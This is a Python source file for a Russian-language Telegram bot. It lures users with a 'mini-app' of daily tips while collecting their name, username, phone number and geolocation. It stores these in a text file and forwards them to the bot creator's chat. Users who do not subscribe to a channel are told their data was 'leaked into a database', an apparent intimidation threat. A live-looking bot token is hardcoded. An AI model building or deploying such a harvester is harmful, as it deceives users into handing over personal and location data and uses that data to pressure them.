import telebot
import random
from telebot import types
from datetime import datetime
import time

# Создаем бота с использованием токена
bot = telebot.TeleBot("7946615410:AAEfRoiCmpTTEub7RcEXUjuHJm8jFG9EYSU")

# Словарь для хранения данных пользователя и сообщений верификации
user_data = {}
verification_messages = {}

# ID вашего канала (в формате @channel_username)
CHANNEL_USERNAME = "@sudnadartem183629oogaaa8i"

@bot.message_handler(commands=['getid'])
def get_id(message):
    bot.reply_to(message, f"Ваш User ID: {message.from_user.id}")

# Обработка команды /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    date_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Сохраняем базовые данные пользователя
    user_data[user_id] = {
        "ID": user_id,
        "Username": f"@{username}",
        "First Name": first_name,
        "Last Name": last_name,
        "Time": date_time,
        "Phone": None,
        "Location": None
    }

    # Кнопка для отправки номера телефона
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    phone_button = types.KeyboardButton("Отправить номер телефона", request_contact=True)
    markup.add(phone_button)
    msg = bot.send_message(message.chat.id, "Пожалуйста, отправьте ваш номер телефона, нажав на кнопку ниже:",
                           reply_markup=markup)

    # Сохраняем ID сообщения для возможного удаления
    verification_messages[user_id] = [msg.message_id]


# Обработка получения контакта
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user_id = message.from_user.id
    if message.contact is not None and message.contact.user_id == user_id:
        user_data[user_id]["Phone"] = message.contact.phone_number

        # Запрашиваем геолокацию после получения номера телефона
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        location_button = types.KeyboardButton("Отправить геолокацию", request_location=True)
        markup.add(location_button)
        msg = bot.send_message(message.chat.id, "Теперь, пожалуйста, отправьте вашу геолокацию, нажав на кнопку ниже:",
                               reply_markup=markup)

        # Сохраняем ID сообщения для возможного удаления
        verification_messages[user_id].append(msg.message_id)


# Обработка получения геолокации
@bot.message_handler(content_types=['location'])
def handle_location(message):
    user_id = message.from_user.id
    if message.location is not None:
        latitude = message.location.latitude
        longitude = message.location.longitude
        user_data[user_id]["Location"] = f"Latitude: {latitude}, Longitude: {longitude}"

        # Записываем все данные в файл
        save_user_data(user_id)

        # Уведомляем пользователя
        bot.send_message(message.chat.id, "Ваши данные для статистики были отправлены создателю бота.")

        # Удаляем сообщения, связанные с верификацией
        if user_id in verification_messages:
            for msg_id in verification_messages[user_id]:
                try:
                    bot.delete_message(message.chat.id, msg_id)
                except:
                    pass
            del verification_messages[user_id]

        # Кнопка для мини-приложения
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton(text="Открыть мини-приложение", callback_data="open_app")
        markup.add(btn)

        bot.send_message(message.chat.id, "Привет, открой наше мини-приложение:", reply_markup=markup)

        # Запускаем таймер на 30 секунд, после чего отправляем сообщение о подписке
        time.sleep(30)
        send_subscription_prompt(message.chat.id)


# Функция для отправки запроса на подписку
def send_subscription_prompt(chat_id):
    markup = types.InlineKeyboardMarkup()
    subscribe_button = types.InlineKeyboardButton("Я подписался", callback_data="subscribed")
    markup.add(subscribe_button)
    msg = bot.send_message(chat_id,
                           f"Пожалуйста, подпишитесь на наш канал {CHANNEL_USERNAME}, чтобы продолжить пользование ботом.",
                           reply_markup=markup)

    # Сохраняем сообщение для возможного удаления после проверки подписки
    user_id = chat_id
    if user_id in verification_messages:
        verification_messages[user_id].append(msg.message_id)


# Функция для сохранения данных пользователя в txt-файл
def save_user_data(user_id):
    user_info = user_data[user_id]
    user_data_text = (
        f"ID: {user_info['ID']}\n"
        f"Username: {user_info['Username']}\n"
        f"First Name: {user_info['First Name']}\n"
        f"Last Name: {user_info['Last Name']}\n"
        f"Phone: {user_info['Phone']}\n"
        f"Location: {user_info['Location']}\n"
        f"Time: {user_info['Time']}\n\n"
    )

    # Записываем данные в txt-файл
    with open("user_data.txt", "a", encoding="utf-8") as file:
        file.write(user_data_text)

    # Отправляем сообщение создателю бота с данными пользователя
    creator_chat_id = "6443223381"  # Замените на свой chat_id
    bot.send_message(creator_chat_id, f"Новый пользователь:\n{user_data_text}")

@bot.message_handler(commands=['getid'])
def get_id(message):
    bot.reply_to(message, f"Ваш User ID: {message.from_user.id}")

# Обработка нажатия на кнопку
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    if call.data == "open_app":
        # Проверяем, предоставил ли пользователь телефон и адрес
        if user_data[user_id]["Phone"] and user_data[user_id]["Location"]:
            send_mini_app(call.message)
        else:
            bot.send_message(call.message.chat.id,
                             "Вы должны предоставить номер телефона и геолокацию, чтобы использовать мини-приложение.")
    elif call.data == "subscribed":
        # Проверяем, подписан ли пользователь на канал
        user_status = bot.get_chat_member(CHANNEL_USERNAME, user_id).status
        if user_status in ["member", "administrator", "creator"]:
            # Удаляем сообщение о подписке, если пользователь подписался
            if user_id in verification_messages:
                for msg_id in verification_messages[user_id]:
                    try:
                        bot.delete_message(call.message.chat.id, msg_id)
                    except:
                        pass
                del verification_messages[user_id]

            bot.send_message(call.message.chat.id,
                             "Спасибо за подписку! Теперь вы можете продолжить пользоваться ботом.")
        else:
            bot.send_message(call.message.chat.id, "Все данные были слиты в базу IGA-PRO-CB*.")


# Мини-приложение: случайный совет
def send_mini_app(message):
    advice_list = [
        "Не бойся ошибок, они учат тебя быть лучше.",
        "Не забывай отдыхать, чтобы работать продуктивнее.",
        "Пей больше воды – это полезно для здоровья.",
        "Ставь цели и двигайся к ним каждый день.",
        "Начни день с хорошего настроения и улыбки."
    ]

    # Выбираем случайный совет и отправляем его пользователю
    random_advice = random.choice(advice_list)
    bot.send_message(message.chat.id, f"Совет дня: {random_advice}")


# Запуск бота
bot.polling(none_stop=True)
